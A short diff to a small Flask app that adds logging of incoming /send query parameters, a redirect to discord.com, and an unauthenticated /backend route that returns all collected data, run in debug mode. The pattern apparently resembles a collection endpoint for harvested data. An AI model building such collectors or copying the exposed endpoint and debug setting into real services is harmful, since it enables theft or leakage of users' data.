@@ -7,11 +7,18 @@ app = Flask(__name__, static_folder='static')
 def index():
     return 'citrus website'
 
+console_list = []
+
 @app.route('/send', methods=['GET', 'POST'])
 def send():
     args = request.args.to_dict()
     print(args)
+    console_list.append(args)
     return redirect('https://discord.com')
+
+@app.route('/backend', methods=['GET'])
+def backend():
+    return console_list
 
 if __name__ == '__main__':
     app.run(debug=True, port=os.getenv("PORT", default=5000))
